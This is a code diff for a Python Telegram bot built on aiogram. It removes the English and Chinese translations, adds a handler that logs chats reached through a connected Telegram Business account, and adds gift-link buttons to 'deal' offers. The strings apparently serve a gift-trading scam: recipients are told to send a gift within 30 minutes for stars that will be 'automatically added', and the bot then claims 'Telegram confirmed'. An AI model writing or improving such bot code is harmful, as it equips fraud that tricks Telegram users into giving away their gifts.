@@ -11,7 +11,7 @@ from aiogram.enums import ParseMode
 from aiogram.filters import CommandStart, Command  
 from aiogram.fsm.storage.memory import MemoryStorage  
 from aiogram.types import (  
-    Message, CallbackQuery, BusinessConnection,  
+    Message, CallbackQuery, BusinessConnection, BusinessMessage,
     InlineKeyboardMarkup, InlineKeyboardButton,  
     ReplyKeyboardMarkup, KeyboardButton  
 )  
@@ -41,42 +41,6 @@ LANGS = {
         "order_not_found": "Ордер не найден",
         "lang_chosen": "✅ Язык успешно изменен на Русский 🇷🇺",
         "choose_lang": "🌐 Выберите язык / Choose language / 选择语言:"
-    },
-    "en": {
-        "welcome": "🏦 <b>{brand}</b>\n\nSend me text with gift link...",
-        "menu_create": "🤝 Create Deal",
-        "menu_lang": "🌍 Language: English",
-        "menu_chats": "📂 My Chats",
-        "btn_publish": "Send: {name}",
-        "btn_delete": "❌ Delete",
-        "timer_text": "⏳ <b>Offer active for {timer} more</b>",
-        "btn_show": "🎁 SHOW GIFT",
-        "btn_reject": "❌ Reject",
-        "btn_accept": "✅ Accept",
-        "alert_accept": "Send the gift within 30 minutes, and {amount} ⭐ will be automatically added to your account.",
-        "order_rejected": "❌ Order rejected.",
-        "order_sent": "Sent: {name}. Telegram confirmed.",
-        "order_not_found": "Order not found",
-        "lang_chosen": "✅ Language changed to English 🇬🇧",
-        "choose_lang": "🌐 Choose language / Выберите язык / 选择语言:"
-    },
-    "zh": {
-        "welcome": "🏦 <b>{brand}</b>\n\n发送带有礼物链接的文本...",
-        "menu_create": "🤝 创建交易",
-        "menu_lang": "🌍 语言: 中文",
-        "menu_chats": "📂 我的聊天",
-        "btn_publish": "发送: {name}",
-        "btn_delete": "❌ 删除",
-        "timer_text": "⏳ <b>优惠有效时间还剩 {timer}</b>",
-        "btn_show": "🎁 查看礼物",
-        "btn_reject": "❌ 拒绝",
-        "btn_accept": "✅ 接受",
-        "alert_accept": "请在 30 分钟内发送礼物，{amount} ⭐ 将自动充值到您的账户中。",
-        "order_rejected": "❌ 订单已拒绝。",
-        "order_sent": "已发送: {name}。Telegram 已确认。",
-        "order_not_found": "未找到订单",
-        "lang_chosen": "✅ 语言已成功切换为中文 🇨🇳",
-        "choose_lang": "🌐 选择语言 / Choose language / 选择语言:"
     }
 }
 
@@ -145,8 +109,12 @@ async def business_connection_handler(bc: BusinessConnection):
     global active_business_connection_id
     if bc.is_enabled:
         active_business_connection_id = bc.id
-        if bc.user:
-            active_business_chats[bc.user.id] = f"{bc.user.first_name}" if not bc.user.username else f"@{bc.user.username}"
+
+@router.business_message()
+async def business_message_handler(bm: BusinessMessage):
+    if bm.chat and not bm.chat.id == bm.from_user.id:
+        name = f"@{bm.chat.username}" if bm.chat.username else (bm.chat.first_name or str(bm.chat.id))
+        active_business_chats[bm.chat.id] = name
 
 @router.message(CommandStart())  
 async def cmd_start(msg: Message):  
@@ -161,9 +129,10 @@ async def cmd_start(msg: Message):
             custom_text = deal[4]
             gift_link = deal[5]
 
-            text_msg = f"{custom_text}"
+            text_msg = f"{custom_text}\n\n{gift_link}"
             
             kb = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text=t["btn_show"], url=gift_link)],
                 [
                     InlineKeyboardButton(text=t["btn_reject"], callback_data=f"sel_reject_{code}"),
                     InlineKeyboardButton(text=t["btn_accept"], callback_data=f"sel_accept_{code}")
@@ -184,35 +153,12 @@ async def cmd_start(msg: Message):
         reply_markup=main_menu(lang)
     )  
 
-@router.message(F.text.in_({"🌍 Язык: Русский", "🌍 Language: English", "🌍 语言: 中文"}))
-async def change_lang_menu(msg: Message):
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="setlang_ru")],
-        [InlineKeyboardButton(text="🇬🇧 English", callback_data="setlang_en")],
-        [InlineKeyboardButton(text="🇨🇳 中文", callback_data="setlang_zh")]
-    ])
-    lang = get_user_lang(msg.from_user.id)
-    t = LANGS[lang]
-    await msg.answer(t["choose_lang"], reply_markup=kb)
-
-@router.callback_query(F.data.startswith("setlang_"))
-async def set_language(cb: CallbackQuery):
-    lang = cb.data.split("_")[1]
-    set_user_lang(cb.from_user.id, lang)
-    t = LANGS[lang]
-    try:
-        await cb.message.edit_text(t["lang_chosen"])
-    except Exception:
-        pass
-    await cb.message.answer(t["welcome"].format(brand=BRAND), parse_mode="HTML", reply_markup=main_menu(lang))
-    await cb.answer()
-
 @router.message(F.text == "📂 Мои чаты")
 async def chats_list(msg: Message):
     if active_business_chats:
-        text = "📋 <b>Подключенные чаты Telegram Business:</b>\n\n" + "\n".join([f"• {name} (ID: <code>{cid}</code>)" for cid, name in active_business_chats.items()])
+        text = "📋 <b>Активные чаты Telegram Business:</b>\n\n" + "\n".join([f"• {name} (ID: <code>{cid}</code>)" for cid, name in active_business_chats.items()])
     else:
-        text = "ℹ️ Активных бизнес-чатов пока нет. Напишите кому-нибудь с подключенным бизнес-аккаунтом."
+        text = "ℹ️ Вы еще никому не писали через Telegram Business. Напишите кому-нибудь в ЛС, и чат появится здесь."
     await msg.answer(text, parse_mode="HTML", reply_markup=main_menu(get_user_lang(msg.from_user.id)))
 
 @router.message(F.text == "🤝 Создать сделку")
@@ -224,7 +170,7 @@ async def handle_deal_creation_text(msg: Message):
     lang = get_user_lang(msg.from_user.id)
     t = LANGS[lang]
 
-    if msg.text in ["🌍 Язык: Русский", "🌍 Language: English", "🌍 语言: 中文", "📂 Мои чаты", "📂 My Chats", "📂 我的聊天", "🤝 Создать сделку", "🤝 Create Deal", "🤝 创建交易"]:
+    if msg.text in ["🌍 Язык: Русский", "📂 Мои чаты", "🤝 Создать сделку"]:
         return
 
     text_content = msg.text.strip()
@@ -247,7 +193,6 @@ async def handle_deal_creation_text(msg: Message):
     conn.commit()  
     conn.close()
 
-    # Формируем кнопки отправки по списку активных бизнес-чатов
     buttons = [
         [
             InlineKeyboardButton(text=t["btn_reject"], callback_data=f"sel_reject_{code}"),
@@ -259,8 +204,7 @@ async def handle_deal_creation_text(msg: Message):
         for cid, name in active_business_chats.items():
             buttons.append([InlineKeyboardButton(text=t["btn_publish"].format(name=name), callback_data=f"sendtochat_{code}_{cid}")])
     else:
-        # Если чатов нет в памяти, выводим тестовую кнопку отправки в чат с ботом
-        buttons.append([InlineKeyboardButton(text=t["btn_publish"].format(name="Себе / Тест"), callback_data=f"sendtochat_{code}_{msg.from_user.id}")])
+        buttons.append([InlineKeyboardButton(text=t["btn_publish"].format(name="Себе (Тест)"), callback_data=f"sendtochat_{code}_{msg.from_user.id}")])
 
     kb = InlineKeyboardMarkup(inline_keyboard=buttons)
     preview_text = f"{text_content}"
@@ -287,9 +231,11 @@ async def send_to_chat(cb: CallbackQuery):
     t = LANGS[lang]
 
     custom_text = deal[4]
+    gift_link = deal[5]
     text_msg = f"{custom_text}"
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=t["btn_show"], url=gift_link)],
         [
             InlineKeyboardButton(text=t["btn_reject"], callback_data=f"sel_reject_{code}"),
             InlineKeyboardButton(text=t["btn_accept"], callback_data=f"sel_accept_{code}")
